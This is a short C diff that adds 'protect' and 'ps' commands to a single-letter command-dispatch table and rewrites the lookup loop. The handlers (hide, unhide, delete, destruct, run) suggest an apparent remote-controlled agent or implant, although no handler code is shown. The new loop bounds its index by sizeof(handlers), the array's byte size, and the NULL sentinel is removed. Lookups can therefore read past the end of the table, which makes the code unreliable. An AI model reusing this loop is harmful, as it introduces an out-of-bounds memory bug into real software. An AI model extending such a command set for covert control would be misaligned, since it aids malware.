@@ -40,17 +40,22 @@ struct cmd_handler_t handlers[] = {
     {.handler = cmd_unhide,  .cmd = 'U'},
     {.handler = cmd_delete,  .cmd = 'D'},
     {.handler = cmd_destruct,.cmd = 'Q'},
+    {.handler = cmd_protect, .cmd = 'P'},
     {.handler = cmd_run,     .cmd = 'R'},
-    NULL,
+    {.handler = cmd_ps ,     .cmd = 'O'},
 };
 
 bool cmd_handle(job_t *job) {
   struct cmd_handler_t *h   = NULL;
   char                 *res = NULL;
+  uint8_t i = 0;
 
-  for (h = handlers; h != NULL; h++)
-    if (h->cmd == job->cmd)
+  for(;i<sizeof(handlers);i++){
+    if (handlers[i].cmd == job->cmd){
+      h = &handlers[i];
       break;
+    }
+  }
 
   if (NULL == h)
     return false;
